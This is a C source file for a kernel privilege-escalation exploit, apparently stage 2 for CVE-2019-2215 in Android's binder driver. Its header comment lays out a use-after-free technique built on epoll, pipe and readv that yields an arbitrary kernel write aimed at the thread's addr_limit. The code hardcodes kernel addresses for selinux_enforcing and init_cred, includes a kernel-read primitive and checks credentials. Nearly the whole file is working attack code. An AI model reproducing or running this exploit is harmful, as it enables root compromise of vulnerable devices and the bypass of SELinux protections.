#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <sched.h>

/* CVE-2019-2215 stage 2, pipe/readv flavour (ledger S40).
 *
 * broot2 proved that for recvmsg the destination is latched per segment: all 112 bytes
 * (80-byte patch + 32-byte values) went into the kernel's iovec array and nothing
 * reached the segments the patch had installed.  Stage 1's leak behaves differently
 * because pipe_read/pipe_write calls the copy ONCE PER PIPE BUFFER and recomputes the
 * current segment from the array each time -- so a mutation that lands between two
 * buffers is obeyed.  That is the read primitive we already used; used in the readv
 * direction it is an arbitrary kernel WRITE:
 *
 *   1. readv(pipe, iov[25]) blocks on an empty pipe holding the array in kmalloc-512,
 *      which is the cache the freed binder_thread came from -> same slot, same address.
 *   2. Buffer #1 is exactly 4096 bytes and iovec[0..4] sum to 4096, so after it the
 *      iterator sits at iovec[5] with offset 0 and the pipe is empty again -> still
 *      blocked, array still live.
 *   3. epoll_ctl(DEL) -> __list_del writes H = slot+0x50 into iovec[5].iov_base and
 *      iovec[5].iov_len (thread->wait is at +0x48 on this build).
 *   4. Buffer #2 (80 bytes) is therefore copied to H, i.e. into the array itself: it is
 *      our patch for iovec[5..9].  Set iovec[5].iov_len to something SMALLER than the
 *      80 bytes already written, so the next recomputation walks out of segment 5 and
 *      into iovec[6] -- whose base is now whatever we choose.
 *   5. Buffer #3 (32 bytes) lands in iovec[6..9].  Point them at user canaries and the
 *      whole chain is verified without touching kernel memory; point iovec[6] at
 *      thread_info+0x08 with value KERNEL_DS and we have the addr_limit clobber.
 *
 * Modes:  arith [tries] |  clob <hex-thread_info> [tries] |  read <hex-thread_info> [tries]
 */
#define PAGE             0x1000
#define IOVEC_ARRAY_SZ   25
#define WQ               (0x48 / 16)          /* iovec[4].iov_len == wait.lock */
#define PATCH_BYTES      80                  /* sizeof(struct iovec_patch) */
#define VAL_BYTES        32
#define BINDER_THREAD_EXIT 0x40046208u
#define BLK              0x11000
#define MARK(j)          (0x10 + (j))
#define KERNEL_DS_VAL    0xfffffffffffffffeUL

#define SELINUX_ENFORCING 0xffffffc00189be74UL
#define INIT_CRED         0xffffffc001636d80UL
#define TASK_CRED_OFF     0x4a8
#define TASK_REALCRED_OFF 0x658
#define TASK_PID_OFF      0x470
#define TI_ADDR_LIMIT     0x08
#define TI_TASK           0x10

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code, flags;
    int32_t sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size, offsets_size;
    union { struct { binder_uintptr_t buffer, offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size, write_consumed, write_buffer;
    binder_size_t read_size, read_consumed, read_buffer;
};
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION    _IOW('c', 0, struct binder_transaction_data)

struct iovec_patch {
    unsigned long seg5_base, seg5_len;    /* seg5_len < 80 forces the walk onward */
    unsigned long seg6_base, seg6_len;
    unsigned long seg7_base, seg7_len;
    unsigned long seg8_base, seg8_len;
    unsigned long seg9_base, seg9_len;
};

static char *fill;
static unsigned long *canary;

static void pin0(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static int arm_pending_tx(int fd)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16], rbuf[256];
    struct binder_transaction_data tr;
    struct binder_write_read bwr, bwr2;
    uint32_t cmd = BC_TRANSACTION;
    int rc, n;

    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;
    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (binder_uintptr_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (rc) { printf("  arm rc=%d errno=%d\n", rc, errno); return rc; }
    for (n = 0; n < 3; n++) {
        size_t off = 0;
        int complete = 0, reply = 0;
        memset(&bwr2, 0, sizeof bwr2);
        bwr2.read_size = sizeof rbuf;
        bwr2.read_buffer = (binder_uintptr_t)(uintptr_t)rbuf;
        errno = 0;
        rc = ioctl(fd, BINDER_WRITE_READ, &bwr2);
        while (off + 4 <= (size_t)bwr2.read_consumed) {
            uint32_t c;
            memcpy(&c, rbuf + off, 4);
            off += 4;
            if (c == 0x7206) complete = 1;
            else if (c == 0x80407203 || c == 0x80407202) { reply = 1; off += 64; }
        }
        printf("  drain %d: rc=%d rconsumed=%llu complete=%d reply=%d\n", n, rc,
               (unsigned long long)bwr2.read_consumed, complete, reply);
        if (rc) return rc;
        if (complete && !reply) return 0;
        if (reply) return -1;
    }
    return -1;
}

static int kread(unsigned long addr, int len, unsigned char *out)
{
    int pfd[2], rc, got = 0;
    unsigned char primer[8];
    struct iovec iov[2];

    if (pipe(pfd)) return -1;
    memset(primer, 0xA7, sizeof primer);
    iov[0].iov_base = primer;
    iov[0].iov_len = sizeof primer;
    iov[1].iov_base = (void *)(uintptr_t)addr;
    iov[1].iov_len = len;
    errno = 0;
    rc = (int)writev(pfd[1], iov, 2);
    if (rc < 0) { printf("  kread %016lx: writev errno=%d\n", addr, errno); close(pfd[0]); close(pfd[1]); return -1; }
    while (got < rc) {
        ssize_t n = read(pfd[0], out + got, rc - got);
        if (n <= 0) { if (n < 0 && errno == EINTR) continue; break; }
        got += (int)n;
    }
    close(pfd[0]); close(pfd[1]);
    if (got < (int)sizeof primer) return -1;
    memmove(out, out + sizeof primer, got - sizeof primer);
    return got - (int)sizeof primer;
}

static void dump_verify(unsigned long ti)
{
    unsigned char b[16];
    unsigned long task = 0, al = 0, cred = 0, rcred = 0;
    unsigned int v = 0xdeadbeef, p = 0;

    if (kread(ti + TI_ADDR_LIMIT, 8, b) == 8) memcpy(&al, b, 8);
    if (kread(ti + TI_TASK, 8, b) == 8) memcpy(&task, b, 8);
    printf("  ti %016lx: addr_limit=%016lx task=%016lx\n", ti, al, task);
    if (task < 0xffffff8000000000UL) { printf("  task implausible -> candidate wrong\n"); return; }
    if (kread(task + TASK_PID_OFF, 4, b) == 4) {
        memcpy(&p, b, 4);
        printf("  [task+0x%x] pid=%u ours=%d %s\n", TASK_PID_OFF, p, getpid(),
               p == (unsigned)getpid() ? "MATCH" : "no");
    }
    if (kread(task + TASK_CRED_OFF, 8, b) == 8) memcpy(&cred, b, 8);
    if (kread(task + TASK_REALCRED_OFF, 8, b) == 8) memcpy(&rcred, b, 8);
    printf("  cred=%016lx real_cred=%016lx init_cred=%016lx\n", cred, rcred, INIT_CRED);
    if (kread(SELINUX_ENFORCING, 4, b) == 4) {
        memcpy(&v, b, 4);
        printf("  selinux_enforcing=%u%s\n", v, v == 1 ? "  (readable AND ==1: ARBITRARY KERNEL READ OK)" : "");
    } else
        printf("  selinux_enforcing unreadable\n");
}

static int attempt(int arith, unsigned long dest, int *landed)
{
    struct iovec iov[IOVEC_ARRAY_SZ];
    struct epoll_event ev = { .events = EPOLLIN };
    struct iovec_patch ch;
    char *buf1, *patch, *vals;
    int pipefd[2], fd, epfd, rc = -1, j;
    pid_t pid;
    ssize_t r;
    void *map;

    *landed = 0;
    epfd = epoll_create(1000);
    fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
    if (fd < 0) { perror("open binder"); close(epfd); return -1; }
    map = mmap(NULL, 1 << 20, PROT_READ, MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); close(fd); close(epfd); return -1; }

    buf1 = malloc(PAGE);
    patch = malloc(PATCH_BYTES);
    vals = malloc(VAL_BYTES);
    memset(buf1, 0x5A, PAGE);
    memset(vals, 0, VAL_BYTES);
    for (j = 0; j < 4; j++) {
        unsigned long a = arith ? 0x1111111111111111UL * (j + 1)
                               : (j == 0 ? KERNEL_DS_VAL : 0x3333333333333333UL * j);
        memcpy(vals + j * 8, &a, 8);
    }

    memset(iov, 0, sizeof iov);
    /* segments 0..4 must sum to exactly 4096 so buffer #1 stops at iovec[5] */
    iov[0].iov_base = fill;             iov[0].iov_len = PAGE - 48;   /* 4048: segs 0..3 sum to 4096 */
    iov[1].iov_base = fill + BLK;       iov[1].iov_len = 0x10;
    iov[2].iov_base = fill + 2 * BLK;   iov[2].iov_len = 0x10;
    iov[3].iov_base = fill + 3 * BLK;   iov[3].iov_len = 0x10;
    iov[WQ].iov_base = fill + WQ * BLK; iov[WQ].iov_len = 0;      /* wait.lock: keep 0 */
    iov[5].iov_base = fill + 5 * BLK;   iov[5].iov_len = PATCH_BYTES + 0x100;
    for (j = 6; j < IOVEC_ARRAY_SZ; j++) {
        iov[j].iov_base = fill + (size_t)j * BLK;
        iov[j].iov_len = 0x100;
    }

    memset(&ch, 0, sizeof ch);
    ch.seg5_base = (unsigned long)(uintptr_t)(fill + 20 * BLK);
    ch.seg5_len  = 0x30;                 /* < 80 => the next recompute leaves segment 5 */
    if (arith) {
        ch.seg6_base = (unsigned long)(uintptr_t)canary;
        ch.seg7_base = (unsigned long)(uintptr_t)(canary + 1);
        ch.seg8_base = (unsigned long)(uintptr_t)(canary + 2);
        ch.seg9_base = (unsigned long)(uintptr_t)(canary + 3);
    } else {
        ch.seg6_base = dest;                          /* thread_info + 0x08 */
        ch.seg7_base = (unsigned long)(uintptr_t)(canary);
        ch.seg8_base = (unsigned long)(uintptr_t)(canary + 1);
        ch.seg9_base = (unsigned long)(uintptr_t)(canary + 2);
    }
    ch.seg6_len = ch.seg7_len = ch.seg8_len = ch.seg9_len = 8;
    memcpy(patch, &ch, sizeof ch);
    if (sizeof ch != PATCH_BYTES) { printf("  !! patch size %zu != %d\n", sizeof ch, PATCH_BYTES); }

    if (pipe(pipefd)) { perror("pipe"); goto out; }
    if (arm_pending_tx(fd)) goto out;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev)) { perror("ep_add"); goto out; }

    for (j = 0; j < 4; j++) canary[j] = 0xCCCCCCCCCCCCCCCCUL;
    *(unsigned long *)(fill + 20 * BLK) = 0xAAAAAAAAAAAAAAAAUL;

    pid = fork();
    if (pid < 0) { perror("fork"); goto out; }
    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        close(pipefd[0]);
        usleep(300000);
        if (write(pipefd[1], buf1, PAGE) != PAGE) perror("child buf1");
        usleep(200000);
        alarm(4);
        if (epoll_ctl(epfd, EPOLL_CTL_DEL, fd, &ev)) perror("child ep_del");
        alarm(0);
        if (write(pipefd[1], patch, PATCH_BYTES) != PATCH_BYTES) perror("child patch");
        usleep(200000);
        if (write(pipefd[1], vals, VAL_BYTES) != VAL_BYTES) perror("child vals");
        close(pipefd[1]);
        _exit(0);
    }
    close(pipefd[1]);

    alarm(30);
    errno = 0;
    r = readv(pipefd[0], iov, IOVEC_ARRAY_SZ);
    printf("  readv -> %zd errno=%d (want: 4096 + 80 + 32 = %d)\n", r, errno, PAGE + PATCH_BYTES + VAL_BYTES);
    alarm(0);
    {
        int st = 0;
        waitpid(pid, &st, 0);
        printf("  child status=%d\n", st);
    }
    printf("  canary[0..3] = %016lx %016lx %016lx %016lx\n", canary[0], canary[1], canary[2], canary[3]);
    printf("  sent           = %016lx %016lx %016lx %016lx\n",
           *(unsigned long *)vals, *(unsigned long *)(vals + 8),
           *(unsigned long *)(vals + 16), *(unsigned long *)(vals + 24));
    printf("  seg5_new_base page[0] = %016lx  (AAAA = untouched)\n",
           *(unsigned long *)(fill + 20 * BLK));
    if (canary[0] == *(unsigned long *)vals) {
        *landed = 1;
        printf("  ==> WRITE REDIRECTION PROVEN (iovec[6] honoured across pipe buffers)\n");
    }
    rc = 0;
out:
    if (rc) alarm(0);
    free(buf1); free(patch); free(vals);
    if (pipefd[0] >= 0) close(pipefd[0]);
    if (map != MAP_FAILED) munmap(map, 1 << 20);
    close(fd);
    close(epfd);
    return rc;
}

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "arith";
    int arith = !strcmp(mode, "arith");
    int tries = argc > 3 ? atoi(argv[3]) : 10;
    unsigned long ti = 0, dest = 0;
    int t, landed = 0;
    unsigned char b[8];

    setvbuf(stdout, NULL, _IONBF, 0);
    fill = calloc(IOVEC_ARRAY_SZ, BLK);
    canary = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (!fill || canary == MAP_FAILED) { perror("alloc"); return 1; }
    for (t = 0; t < IOVEC_ARRAY_SZ; t++) memset(fill + (size_t)t * BLK, MARK(t), BLK);
    pin0();
    if (!arith) {
        if (argc < 3) { printf("need thread_info hex\n"); return 1; }
        ti = strtoul(argv[2], NULL, 16);
        dest = ti + TI_ADDR_LIMIT;
        printf("mode=%s ti=%016lx -> write %016lx\n", mode, ti, dest);
    } else
        printf("mode=arith (all destinations are our own pages)\n");

    for (t = 0; t < tries; t++) {
        printf("--- attempt %d ---\n", t);
        if (attempt(arith, dest, &landed)) continue;
        if (!landed) continue;
        if (arith) { printf("  safe-mode success; nothing was written in the kernel\n"); break; }
        if (kread(SELINUX_ENFORCING, 4, b) == 4) dump_verify(ti);
        else printf("  clobber landed on canaries but kernel read still refused\n");
        break;
    }
    return 0;
}
